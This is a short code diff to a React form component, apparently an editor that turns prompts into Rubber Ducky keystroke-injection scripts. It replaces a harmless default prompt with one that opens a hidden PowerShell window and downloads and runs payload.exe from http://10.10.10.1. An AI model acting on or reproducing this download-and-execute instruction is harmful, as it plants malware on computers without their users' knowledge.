@@ -30,7 +30,7 @@ export function RubberDuckyEditor() {
   const form = useForm<z.infer<typeof formSchema>>({
     resolver: zodResolver(formSchema),
     defaultValues: {
-      prompt: 'Open notepad, type "Hello from NETRA-X", and then save it to the desktop as message.txt',
+      prompt: 'Open a hidden powershell window, download a file from http://10.10.10.1/payload.exe to the temp folder, and then execute it.',
     },
   });
 
